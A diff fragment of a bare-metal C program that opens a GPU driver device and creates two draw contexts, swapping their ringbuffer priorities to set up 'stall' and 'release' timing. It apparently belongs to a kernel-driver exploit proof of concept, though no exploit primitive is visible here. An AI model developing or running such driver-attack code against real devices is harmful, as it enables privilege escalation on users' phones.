@@ -79,13 +79,13 @@ void _start(void){
     if(gfd<0){out("[!] open fail\n");sys3(SYS_exit,1,0,0);return;}
     struct ctx c0,c1;
     struct kgsl_drawctxt_create d;
-    d.flags=0x1012u; d.drawctxt_id=0;  /* prio 1 -> rb0 */
+    d.flags=0xC012u; d.drawctxt_id=0;  /* prio 12 -> rb3 (lowest) : stall */
     if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx0 fail\n");sys3(SYS_exit,1,0,0);return;}
     c0.id=d.drawctxt_id;
-    d.flags=0x8012u; d.drawctxt_id=0;  /* prio 8 -> rb2 */
+    d.flags=0x1012u; d.drawctxt_id=0;  /* prio 1 -> rb0 (highest) : release */
     if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx1 fail\n");sys3(SYS_exit,1,0,0);return;}
     c1.id=d.drawctxt_id;
-    out("[1] ctx0(rb0)=");outdec(c0.id);out(" ctx1(rb2)=");outdec(c1.id);out("\n");
+    out("[1] ctx0(rb3,stall)=");outdec(c0.id);out(" ctx1(rb0,release)=");outdec(c1.id);out("\n");
     if(alloc_buf(0x1000,&c0.cmdid,&c0.cmdgpu,&c0.cmd)){out("[!] buf0\n");sys3(SYS_exit,1,0,0);return;}
     if(alloc_buf(0x1000,&c1.cmdid,&c1.cmdgpu,&c1.cmd)){out("[!] buf1\n");sys3(SYS_exit,1,0,0);return;}
     u32 outid; if(alloc_buf(0x1000,&outid,&gout_gpu,&gout)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
